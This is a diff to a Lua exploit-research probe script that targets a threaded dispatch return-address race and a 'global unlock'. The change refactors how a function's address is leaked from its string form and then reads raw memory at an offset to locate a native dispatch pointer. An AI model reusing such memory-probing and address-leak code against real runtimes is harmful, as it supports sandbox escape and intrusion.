@@ -13,7 +13,7 @@
 --
 -- Sections: A=read dispatch bytes, B=writability test, C=threaded race, D=global unlock
 
-local TEST_SECTION = "A"
+local TEST_SECTION = "B"
 
 print("=== PROBE 85b: THREADED DISPATCH RETADDR RACE + GLOBAL UNLOCK ===")
 print("Section: " .. TEST_SECTION)
@@ -189,18 +189,23 @@ if TEST_SECTION == "A" then
     print("=== A: DISPATCH FUNCTION BYTES ===")
     print("")
 
+    local function parse_func_addr(fn)
+        local s = tostring(fn)
+        local hex = s:match("0x([0-9a-fA-F]+)") or s:match(":%s*([0-9a-fA-F][0-9a-fA-F]+)%s*$")
+        if hex then return uint64("0x" .. hex), hex end
+        return nil, nil
+    end
+
     local mt = getmetatable(syscall.pipe)
     repeat
         if not mt or not mt.__call then
             print("ERROR: no __call metatable"); break
         end
-        local cs = tostring(mt.__call)
-        local ca = cs:match("function: (%d+)") or cs:match("function: (0x[0-9a-fA-F]+)")
-            or cs:match("(%d+)$")
-        if not ca then print("ERROR: cannot parse __call addr: " .. cs); break end
-
-        local call_addr = uint64(ca)
-        print("__call GCObject: " .. fmt_addr(call_addr))
+        local call_addr, call_hex = parse_func_addr(mt.__call)
+        if not call_addr then
+            print("ERROR: cannot parse __call addr: " .. tostring(mt.__call)); break
+        end
+        print("__call GCObject: 0x" .. call_hex .. " (" .. fmt_addr(call_addr) .. ")")
 
         local cfunc = safe_rq(call_addr + 0x20)
         print("dispatch fn (+0x20): " .. fmt_addr(cfunc))
